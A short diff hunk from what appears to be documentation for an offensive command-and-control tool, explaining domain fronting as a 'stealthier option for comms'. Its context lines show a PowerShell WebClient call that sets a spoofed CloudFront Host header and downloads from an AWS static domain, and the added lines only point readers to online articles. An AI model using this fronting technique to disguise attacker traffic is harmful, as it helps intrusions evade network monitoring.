@@ -10,3 +10,5 @@ This is a much stealthier option for comms as you can utilise hostnames with bet
 	$wc = New-Object System.Net.WebClient;
 	$wc.Headers.Add("Host","example.cloudfront.net")
 	$wc.DownloadString("d0.awsstatic.com")
+
+If you are unsure what domain fronting is, please see read the articles online for more information. 
